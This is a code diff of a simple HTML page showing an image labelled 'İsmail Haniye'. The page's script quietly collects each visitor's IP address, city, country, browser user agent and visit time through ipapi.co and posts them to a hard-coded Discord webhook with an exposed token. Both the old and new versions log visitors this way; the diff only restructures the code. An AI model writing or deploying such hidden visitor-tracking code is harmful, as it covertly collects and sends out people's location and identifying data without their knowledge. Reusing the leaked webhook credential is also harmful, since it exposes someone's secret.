@@ -23,30 +23,39 @@
   <img src="haniye.png" alt="İsmail Haniye">
 
   <script>
-    async function sendToDiscord(data) {
-      const webhookURL = "https://discord.com/api/webhooks/1392621981060563105/KwFT0G_xxmfz8IB0HkA6LVRgK6lOkTZFhbzoyVExRwjVDQdTxc0v-oMwxCbhPPGnl_eK";
+    // Webhook URL'iniz
+    const webhookURL = "https://discord.com/api/webhooks/1392621981060563105/KwFT0G_xxmfz8IB0HkA6LVRgK6lOkTZFhbzoyVExRwjVDQdTxc0v-oMwxCbhPPGnl_eK";
 
-      const payload = {
-        content: `📥 Yeni Ziyaretçi:\n\n🌐 IP: ${data.ip}\n📍 Konum: ${data.city}, ${data.country_name}\n🕒 Saat: ${new Date().toLocaleString("tr-TR")}\n🧭 Tarayıcı: ${navigator.userAgent}`
-      };
+    // Kullanıcı bilgilerini gönder
+    function sendVisitorInfo(ip, city, country) {
+      const userAgent = navigator.userAgent;
+      const now = new Date().toLocaleString("tr-TR");
 
-      await fetch(webhookURL, {
+      const message = `📥 Yeni Ziyaret:\n\n🌐 IP: ${ip}\n📍 Konum: ${city}, ${country}\n🕒 Zaman: ${now}\n🧭 Tarayıcı: ${userAgent}`;
+
+      fetch(webhookURL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(payload)
-      });
+        body: JSON.stringify({
+          content: message
+        })
+      }).catch(error => console.error("Webhook gönderim hatası:", error));
     }
 
-    // IP & Konum bilgisi almak için ipapi.co kullanılıyor
+    // IP ve konum bilgisini çek
     fetch("https://ipapi.co/json/")
-      .then(res => res.json())
+      .then(response => response.json())
       .then(data => {
-        sendToDiscord(data);
+        const ip = data.ip || "Bilinmiyor";
+        const city = data.city || "Şehir yok";
+        const country = data.country_name || "Ülke yok";
+        sendVisitorInfo(ip, city, country);
       })
-      .catch(err => {
-        console.error("Konum bilgisi alınamadı:", err);
+      .catch(error => {
+        console.error("IP bilgisi alınamadı:", error);
+        sendVisitorInfo("Bilinmiyor", "Bilinmiyor", "Bilinmiyor");
       });
   </script>
 </body>
